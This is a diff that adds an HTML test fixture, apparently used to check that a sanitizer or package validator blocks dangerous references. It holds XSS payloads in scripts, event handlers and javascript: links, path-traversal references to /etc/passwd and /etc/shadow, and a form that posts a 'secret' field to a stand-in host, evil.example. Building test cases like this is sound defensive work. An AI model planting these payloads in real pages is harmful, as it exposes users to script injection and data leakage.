@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<title>恶意引用样张</title>
+<base href="https://evil.example/">
+<meta http-equiv="refresh" content="0; url=https://evil.example/">
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="missing.css">
+<link rel="stylesheet" href="https://evil.example/x.css">
+<style>
+  @import url("https://evil.example/import.css");
+  .ext { background: url(https://evil.example/bg.png); }
+  .esc { background: url(../escape.png); }
+  .ok  { background: url(ok.png); }
+</style>
+<script>alert("xss")</script>
+</head>
+<body onclick="alert(1)">
+<h1 onmouseover="alert(2)">恶意引用样张（所有危险内容都应被拦截并列在报告中）</h1>
+<p>正常图片：<img src="ok.png" alt="ok" width="32"></p>
+<img src="missing.png" alt="missing">
+<img src="https://evil.example/track.png" alt="">
+<img src="//evil.example/proto-relative.png" alt="">
+<img src="../../../etc/passwd" alt="">
+<img src="/etc/passwd" alt="">
+<img src="data:image/png;base64,iVBORw0KGgo=" alt="">
+<img srcset="https://evil.example/a.png 1x, ok.png 2x" alt="">
+<ul>
+  <li><a href="javascript:alert(1)">javascript: 链接</a></li>
+  <li><a href="../../../etc/shadow">越界链接</a></li>
+  <li><a href="https://evil.example/">包外链接</a></li>
+  <li><a href="ok.html" target="_top">正常页面链接（target=_top 会被剥掉）</a></li>
+</ul>
+<form action="https://evil.example/collect" method="post">
+  <input name="secret" value="leak">
+  <button formaction="https://evil.example/x">提交</button>
+</form>
+<iframe src="https://evil.example/frame"></iframe>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<object data="https://evil.example/obj"></object>
+<embed src="https://evil.example/emb">
+<svg onload="alert(1)" width="10" height="10"><a xlink:href="javascript:alert(1)"><text x="0" y="8">x</text></a></svg>
+<p style="background:url(https://evil.example/inline.png)">内联样式里的包外引用</p>
+</body>
+</html>
